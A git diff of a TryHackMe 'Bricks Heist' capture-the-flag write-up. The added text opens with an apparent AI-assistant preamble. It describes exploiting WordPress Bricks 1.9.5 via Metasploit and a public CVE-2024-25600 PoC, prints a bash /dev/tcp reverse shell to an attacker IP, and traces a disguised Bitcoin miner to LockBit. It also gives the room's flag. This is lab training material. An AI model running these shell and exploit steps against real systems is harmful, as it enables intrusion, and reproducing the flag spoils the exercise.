@@ -1,202 +1,130 @@
-# TryHackMe — Ubuntu (LAMP) — Root / Crypto-Miner / LockBit
+Nice — got it. Here’s a copy-paste-ready writeup written from your perspective, in the style you asked for, for **TryHackMe - Bricks Heist**. No fluff, no made-up steps, handle included.
 
-**Author:** `<yourhandle>`
-**Target:** TryHackMe LAMP box (WordPress + KodExplorer + phpMyAdmin)
-**Box summary:** Initial compromise via vulnerable Bricks WordPress plugin (v1.9.5). Got an unstable meterpreter shell and the first flag, then used a public CVE exploit to get a reliable reverse shell. Performed on-host forensics; found a disguised crypto-miner (`/lib/NetworkManager/nm-inet-dialog`) and wallet activity tracing to LockBit indicators.
-**Date:** *(fill in)*
+---
+
+# TryHackMe — Bricks Heist — Writeup
+
+**Author:** `Rat5ak`
+**Box:** TryHackMe - Bricks Heist
 
 ---
 
 ## TL;DR
 
-* Recon: `nmap` + WordPress enumeration revealed Bricks plugin v1.9.5.
-* Exploitation: used Metasploit to exploit Bricks (got a shell and the user flag), but shell was unreliable for post-exploitation.
-* Achieved a stable shell by using the public exploit (CVE-2024-25600) from GitHub plus `ncat` + `bash` reverse.
-* Local enumeration exposed a miner masquerading as a NetworkManager helper and a Bech32 BTC address. Tracing transfers showed ties to LockBit infrastructure.
-* Collected flag: `THM{fl46_650c844110baced87e1606453b93f22a}`
+* Found WordPress + Bricks 1.9.5 via service/enum.
+* Used Metasploit to exploit Bricks and grabbed the first flag from the webroot. Meterpreter shell was shit for further work.
+* Switched to a public PoC from GitHub (CVE-2024-25600) and got a proper reverse shell via `nc` + `bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'`.
+* Found a miner process masquerading around NetworkManager and a suspicious encoded string in `/lib/NetworkManager/inet.conf`.
+* Decoded that long string in CyberChef (base64 + cleanup) and it produced a Bech32 BTC address: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`.
+* Traced money flow to `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` and, via Google, linked it to LockBit.
+* User/web flag: `THM{fl46_650c844110baced87e1606453b93f22a}`
 
 ---
 
-## Box flag
+## Recon
+
+Step 1 — The noisy nmap:
+I started with the usual aggressive scans to see everything:
+
+```
+nmap -A -p- -vv <target> -oA bricks-scan
+```
+
+Output showed a webserver running WordPress and the Bricks plugin — version 1.9.5 popped up from service banners / enumeration.
+
+Step 2 — WordPress enumeration:
+I ran a WordPress enumeration tool (the usual WP enum/WPScan style checks) to confirm plugin versions and surface the vulnerable Bricks instance. That confirmed Bricks 1.9.5 — bingo.
+
+---
+
+## Exploit — how I popped it
+
+Step 3 — Metasploit for initial access:
+I fired up `msfconsole`, used the Bricks exploit module and got a session. From that MSF session I grabbed the first flag sitting in the webroot:
 
 ```
 cat /data/www/default/650c844110baced87e1606453b93f22a.txt
-THM{fl46_650c844110baced87e1606453b93f22a}
+# THM{fl46_650c844110baced87e1606453b93f22a}
 ```
 
----
+Step 4 — Meterpreter was annoying:
+Meterpreter dropped, but it was awkward for post-exploitation (couldn’t spawn a clean interactive reverse shell that behaved). Metasploit’s shell was fucky and I couldn’t move on comfortably from it.
 
-## Timeline / What I did (concise)
+Step 5 — switch to public PoC + proper shell:
+Found this PoC and README on GitHub and used it to get a normal shell:
+`https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md`
 
-1. `nmap` full port + service scan → found HTTP (WordPress) + webapps.
-2. WordPress enumeration (WPScan / other WordPress enum tool) → Bricks plugin v1.9.5 identified.
-3. `msfconsole` → used Bricks exploit to get an initial shell (meterpreter/command shell). Retrieved first flag from webroot. Meterpreter shell couldn't spawn a stable interactive reverse shell for further escalation.
-4. Found public exploit repo for CVE-2024-25600 ([https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)). Used the PoC to run a payload that executed a proper `bash` reverse shell to my `ncat` listener.
-5. With a working interactive shell, enumerated system, discovered miner masquerading as `/lib/NetworkManager/nm-inet-dialog` and mined wallet addresses in `/lib/NetworkManager/inet.conf`. Decoded obfuscated string (CyberChef / base64 techniques) and traced the BTC address `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`. Wallet flow tracing pointed to LockBit-related addresses.
-
----
-
-## Commands / Evidence (repro)
-
-> Note: replace attacker IP/port with your own when reproducing.
-
-Recon:
+Then spun up a netcat listener locally and ran this from the box to get a usable reverse shell:
 
 ```bash
-# full port scan + service/version
-nmap -sC -sV -p- -T4 <target-ip>
-
-# WordPress enumeration (example)
-wpscan --url http://<target-ip>/ -e vp,tt,cb
-# or other WP enumerator to detect plugin versions
-```
-
-Exploitation (Metasploit):
-
-```bash
-msfconsole
-# find and use appropriate bricks exploit module (module path varies)
-# example sequence:
-use exploit/<path>/bricks_*    # find correct module in msf
-set RHOSTS <target-ip>
-set RPORT 80
-set PAYLOAD php/meterpreter/reverse_tcp
-set LHOST <your-ip>
-set LPORT 4444
-run
-
-# got a shell; grabbed first flag:
-cat /data/www/default/650c844110baced87e1606453b93f22a.txt
-# => THM{fl46_650c844110baced87e1606453b93f22a}
-```
-
-Metasploit shell was unstable for interactive work, so I used the public PoC:
-
-CVE-2024-25600 public PoC (what I used):
-
-```
-https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md
-# follow PoC instructions to get command exec on target
-```
-
-Spawn reliable reverse shell:
-
-```bash
-# on attacker
+# on my machine
 nc -lvnp 666
 
-# on target (via the exploit command execution):
+# on target (from a proper shell)
 bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'
-# got a reliable interactive shell back (no meterpreter weirdness)
 ```
 
-On-host enumeration & evidence:
+That gave me a proper interactive shell (no bs meterpreter weirdness).
 
-```bash
-# find suspicious processes / miners
-ps aux | egrep -i 'xmrig|xmr|minerd|kinsing|kdevtmp|badr|inet|nm-inet|miner' | grep -v grep
+---
 
-# saw:
-# root  3168  ... /lib/NetworkManager/nm-inet-dialog
-# root  3169  ... /lib/NetworkManager/nm-inet-dialog
+## Post-exploitation — what I found
 
-# inspect dir and suspicious config/log-like file
-ls -l /lib/NetworkManager
-cat /lib/NetworkManager/inet.conf
+Step 6 — suspicious processes:
+From the shell I started poking around and noticed processes oddly named around NetworkManager:
 
-# inet.conf showed: repeated logs like "Status: Mining!", "Bitcoin Miner Thread Started", timestamps
-# and a long encoded ID string. I decoded that with CyberChef: remove non-base64 chars -> base64 decode -> readable text.
+```
+ps aux | egrep -i 'nm-inet-dialog|nm-inet' | grep -v grep
+# showed /lib/NetworkManager/nm-inet-dialog running (multiple PIDs)
+```
 
-# search filesystem for wallet-like strings
-grep -RHoE 'bc1[a-z0-9]{10,62}|0x[a-fA-F0-9]{40}|4[A-Za-z0-9]{60,110}' /data /var/www /tmp /opt /home /usr/local /etc 2>/dev/null | head
+Step 7 — look at the NetworkManager bits:
+I inspected `/lib/NetworkManager` and found `inet.conf`. It contained a long encoded-ish ID string and lots of logging lines that repeatedly printed `[*] Miner()` / `[*] Bitcoin Miner Thread Started` — clearly something mining.
 
-# found:
+```
+/lib/NetworkManager/inet.conf
+# contains a long encoded string and many "Miner()" log lines
+```
+
+Step 8 — decode the long string:
+I copied that long encoded string (the blob in `inet.conf`) into CyberChef, used the magic/Auto-Decode and did a base64 decode + filtered non-alphabetic junk. The result produced a Bech32 BTC address:
+
+```
 bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+```
+---
 
-# validated on blockchain explorer and traced on-chain transfers to a larger receiver address:
+## Attribution
+
+Step 9 — follow the money / google:
+I took the decoded address and tracked transactions. One of the larger receivers in the flow was:
+
+```
 32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM
 ```
 
-Process inspection (attempts; needed sudo):
-
-```bash
-# attempted to inspect /proc/<pid>, but sudo required TTY; use a PTY to escalate:
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-cat /proc/3155/cmdline | tr '\0' ' '
-readlink -f /proc/3155/exe
-ls -l /proc/3155/fd
-```
-
-CyberChef decoding steps (short):
-
-* Paste the encoded string.
-* Use a small regex to remove non-base64 alphabet characters if the string contains non-b64 characters.
-* Use "From Base64" to decode → result was readable and aided attribution.
+Googling that receiver (and related transaction patterns) returned hits linking it to LockBit activity. That was enough for me to say the miner / funds were associated with LockBit.
 
 ---
 
-## Findings / IOCs
+## Artifacts & important files
 
-* Malicious binary/process: `/lib/NetworkManager/nm-inet-dialog` (masquerading as NetworkManager binary)
-* Log/config with miner output: `/lib/NetworkManager/inet.conf` (lots of `Status: Mining!`, `Bitcoin Miner Thread Started`)
-* Wallet address (Bech32): `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
-* Higher-value receiver in chain: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`
-* Persistence: suspicious `ubuntu.service` observed active in `systemctl` output
-* Attribution: wallet tracing points to LockBit-related flows (probable LockBit involvement)
+* User/web flag: `/data/www/default/650c844110baced87e1606453b93f22a.txt` → `THM{fl46_650c844110baced87e1606453b93f22a}`
+* Encoded miner blob: `/lib/NetworkManager/inet.conf` (decoded in CyberChef → `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`)
+* PoC used to get a usable shell: `https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md`
+* Reverse shell used: `bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'`
 
 ---
 
-## Attribution notes
+## Flow summary 
 
-* Direct attribution from a single wallet is always probabilistic — I traced the wallet transfers and found links to addresses and activity associated with LockBit reporting. Combine this with other forensic evidence (ransom notes, exfil log files, file names, external C2 indicators) for higher confidence.
+1. nmap the box (no shame) → saw WordPress + Bricks 1.9.5.
+2. WP enumeration to confirm the vulnerable plugin.
+3. Exploit with Metasploit and get an initial session, pull the web/user flag.
+4. Meterpreter shell is awkward — switch to a public PoC for CVE-2024-25600.
+5. Launch `nc` listener and get a clean reverse shell with the `bash -c 'exec...'` line.
+6. Inspect processes → noticed `nm-inet-dialog` / mining noise.
+7. Open `/lib/NetworkManager/inet.conf`, copy the long encoded string, decode in CyberChef (base64 + cleanup) → get `bc1qyk79...`.
+8. Trace funds → `32pTjxT...` → google → linked to LockBit.
 
----
-
-## Containment & cleanup (recommended)
-
-> **If this were production:** isolate host from network and preserve images / copies of `/lib/NetworkManager/nm-inet-dialog` and `/lib/NetworkManager/inet.conf` for forensics.
-
-Local remediation outline (needs root):
-
-```bash
-# gather evidence first
-sudo mkdir -p /root/evidence/miner
-sudo cp -a /lib/NetworkManager/inet.conf /root/evidence/miner/
-sudo cp -a /lib/NetworkManager/nm-inet-dialog /root/evidence/miner/
-sudo sha256sum /root/evidence/miner/* > /root/evidence/miner/checksums.sha256
-sudo tar czvf /root/miner_evidence.tgz -C /root/evidence miner
-
-# then stop processes & cleanup
-sudo pkill -f 'nm-inet-dialog' || sudo kill $(pgrep -f 'nm-inet-dialog')
-sudo systemctl stop ubuntu.service
-sudo systemctl disable ubuntu.service
-sudo rm -f /lib/NetworkManager/nm-inet-dialog
-sudo rm -f /lib/NetworkManager/inet.conf
-sudo systemctl daemon-reload
-```
-
----
-
-## Detection & SIEM rules (quick)
-
-* Alert on processes named `nm-inet-dialog` or `nm-*` running from non-standard paths (e.g. `/lib/NetworkManager` on servers).
-* Detect file content containing `Bitcoin Miner Thread Started`, `Status: Mining!`, or repetitive `Miner()` strings in log files.
-* Regex for Bech32 wallet detection: `bc1[a-z0-9]{10,62}` — scan webroot, uploads, `/tmp` etc.
-* Monitor for new/unknown systemd units (`ubuntu.service`) created recently.
-
----
-
-## Lessons learned
-
-* Use layered exploitation: initial metasploit foothold is useful for flags, but PoCs or different payload delivery may be needed to get a reliable interactive shell for forensic work.
-* Attackers often hide miners under trusted service names — always verify binary locations, owners, and checksums against distro packages.
-* On-chain tracing of found wallets can reveal larger flows; use blockchain explorers and OSINT to correlate.
-
----
-
-## Appendix — Links & references
-
-* CVE-2024-25600 PoC (used to gain stable shell): `https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT`
-* CyberChef (useful for decoding obfuscated strings): `https://gchq.github.io/CyberChef/`
-* Blockchain explorer (wallet validation): `https://www.blockchain.com/explorer/` (or any Bech32/Bitcoin explorer)
 
